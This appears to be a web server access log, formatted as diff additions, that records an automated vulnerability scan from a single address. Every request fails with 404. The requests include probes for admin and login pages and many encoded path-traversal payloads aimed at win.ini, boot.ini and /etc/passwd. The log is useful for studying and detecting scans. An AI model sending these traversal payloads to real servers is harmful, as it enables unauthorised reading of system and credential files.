+INFO:     198.82.145.75:38372 - "GET /dms2/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38394 - "GET /file HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38402 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38408 - "GET /wavemaster.internal HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38424 - "GET /home.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38426 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38436 - "GET /sws/data/sws_data.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38448 - "JUTPCM / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38454 - "GET /wcd/system.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38470 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38478 - "GET /MSWSMTP/Common/Authentication/Logon.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38480 - "GET /js/Device.js HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:38492 - "GET /ptz.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38500 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38504 - "GET /admin/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38510 - "GET /dKn5J3zt2bdg.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38516 - "GET /loginMsg.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38526 - "GET /dKn5J3zt2bdg.cgi HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:38544 - "GET /dKn5J3zt2bdg.sh HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:38562 - "GET /dKn5J3zt2bdg.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38572 - "GET /dKn5J3zt2bdg.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38576 - "GET /dKn5J3zt2bdg.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38584 - "GET /dKn5J3zt2bdg.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38598 - "GET /dKn5J3zt2bdg.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38610 - "GET /dKn5J3zt2bdg.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38620 - "GET /dKn5J3zt2bdg.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38626 - "GET /cgi-bin/dKn5J3zt2bdg.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38634 - "GET /cgi-bin/dKn5J3zt2bdg.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38644 - "GET /cgi-bin/dKn5J3zt2bdg.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38652 - "GET /cgi-bin/dKn5J3zt2bdg.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38660 - "GET /cgi-bin/dKn5J3zt2bdg.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38666 - "GET /cgi-bin/dKn5J3zt2bdg.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38668 - "GET /cgi-bin/dKn5J3zt2bdg.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38674 - "GET /cgi-bin/dKn5J3zt2bdg.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38680 - "GET /cgi-bin/dKn5J3zt2bdg.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38686 - "GET /cgi-bin/dKn5J3zt2bdg.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38702 - "GET /scripts/dKn5J3zt2bdg.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38704 - "GET /scripts/dKn5J3zt2bdg.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38706 - "GET /scripts/dKn5J3zt2bdg.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38712 - "GET /scripts/dKn5J3zt2bdg.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38720 - "GET /scripts/dKn5J3zt2bdg.inc HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38724 - "GET /scripts/dKn5J3zt2bdg.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38728 - "GET /scripts/dKn5J3zt2bdg.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38730 - "GET /scripts/dKn5J3zt2bdg.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38732 - "GET /scripts/dKn5J3zt2bdg.php3 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38740 - "GET /scripts/dKn5J3zt2bdg.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38752 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38768 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38772 - "GET /xampp/index.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38788 - "GET /SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38800 - "GET /snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38804 - "GET /snoop/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38812 - "GET /servlet/SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38818 - "GET /servlet/snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38828 - "GET /servlet/snoop/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38832 - "GET /triton-help/en/first.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38834 - "GET /console/login/LoginForm.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38850 - "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38862 - "GET /active.log HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38868 - "GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38880 - "GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38882 - "GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38896 - "GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38906 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38922 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38930 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38944 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38954 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38956 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38972 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38980 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38996 - "GET //../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39006 - "GET //../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39016 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39024 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39034 - "GET /../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39044 - "GET /../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39046 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39052 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39064 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39070 - "GET %5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39072 - "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39080 - "GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39088 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39096 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39098 - "GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39108 - "GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39118 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39122 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39134 - "GET /././././././../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39144 - "GET /././././././../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39150 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39164 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39180 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39192 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39198 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39208 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39224 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39232 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39236 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39238 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39242 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39256 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39272 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39288 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39292 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39304 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39308 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39314 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39330 - "GET //../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39344 - "GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39346 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39356 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39368 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39378 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39394 - "GET /././././././../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39396 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39408 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39424 - "GET /scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39430 - "GET /main_internet.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39440 - "GET /cfg/shortcuts HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39456 - "GET /hc/error/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39472 - "GET /ui/login.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39476 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39478 - "GET /hc/admin/login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39484 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39486 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39492 - "GET /portal/diag/index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39496 - "GET /menu.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39510 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39526 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39532 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39544 - "GET /mdm/web/login.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39550 - "GET /officescan/console/html/common/l10n/l10n.global.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39552 - "GET /webapp/js/UI_String.en-US.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39556 - "GET /webpages/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39564 - "GET /webpages/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39572 - "GET /webpages/login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39584 - "GET /nessus-check/tomcat_error_version.nasl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39590 - "GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39604 - "GET /tightvnc-jviewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39606 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39610 - "GET /spotfire/about.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39622 - "GET /jasperserver-pro/login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39628 - "GET /tos/index.php?user/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39636 - "GET /tos/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39646 - "GET /js/macro_config.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39648 - "GET /brightmail/viewLogin.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39662 - "POST /webui/apps/sdcss HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39676 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39680 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39692 - "GET /index.JSP HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39706 - "GET /idm/login.jsp?lang=en&cntry= HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39720 - "GET /config-browser/showJars.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39722 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39732 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39738 - "GET /userportal/webpages/myaccount/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39744 - "GET /webconsole/webpages/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39752 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39758 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39762 - "GET /api/sonicos/is-sslvpn-enabled HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39772 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39780 - "GET /solr/%23 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39784 - "GET /%23 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39798 - "GET //admincp/login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39812 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39824 - "GET /swvm/ConsoleContainer.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39826 - "GET /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39836 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39844 - "GET /Orion/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39846 - "GET /Orion/Login.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39860 - "GET /lem/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39870 - "POST /av-centerd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39878 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39892 - "GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39898 - "GET /stream/0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39912 - "GET /content/sIwq1HW8xj.mp3 HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:39920 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39934 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5C..%5Cglobal.asa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39950 - "POST /sawmillcl.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39960 - "GET /sawmillcl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39976 - "POST /sawmill6cl.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39984 - "GET /sawmill6cl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40000 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40008 - "GET /?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40014 - "GET /SAPHostControl/?wsdl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40030 - "GET /sapmc/sapmc.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40032 - "GET /search/results.stm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40044 - "GET /apps/zxtm/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40056 - "GET /cgi-bin/client_execute.cgi?tUD=0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40070 - "GET /wrcontrollite.ssi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40086 - "GET /login1.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40094 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40102 - "GET /login.html?1600 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40118 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40126 - "GET /eyespyfx_large.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40138 - "GET /cgi-bin/guestimage.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40140 - "GET /pda/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40144 - "GET /ivc2/Backup/IVC1/html/index.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40152 - "GET /view/hsrindex.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40156 - "GET /Webcam/webcam.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40170 - "GET /cgi-bin/camctrl.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40174 - "GET /cgi-bin/ctrldirect.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40176 - "GET /user_view_S.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40178 - "GET /ViewerFrame?Mode=Motion HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40190 - "GET /app/idxasp.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40206 - "GET /view/index.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40208 - "GET /view/view.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40222 - "GET /main.cgi?next_file=main.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40238 - "GET /view.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40246 - "GET /vncviewer.jar HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40262 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40278 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40286 - "GET /photo/lang/ENG.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40290 - "GET /1760714266/facts/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40296 - "GET /1760714266/certificate/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40298 - "GET /v2.0/environments/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40312 - "GET /puppet-ca/v1/certificate/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40326 - "GET /puppet/v3/facts/128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40332 - "GET /cas/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40334 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40336 - "GET /NmConsole/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40340 - "GET /progs/homepage HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40354 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40368 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40384 - "GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40400 - "GET //perl?-v HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40416 - "GET //perl.exe?-v HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40418 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40420 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40432 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40434 - "GET /owncloud/index.php/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40444 - "GET /login.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40456 - "GET /exchweb/bin/auth/owalogon.asp?url=http://12345678910 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40466 - "GET /otrs/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40482 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40488 - "GET /geoserver/web/?0 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40498 - "GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40502 - "GET /cs/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40516 - "GET /idc/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40530 - "GET //idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40540 - "GET /web-determinations/?CookieSet=true HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40546 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40562 - "GET /sgdadmin/faces/jsp/Version.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40564 - "GET /gateway/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40572 - "GET /portal/page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40576 - "GET /page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40580 - "GET /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40586 - "GET /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
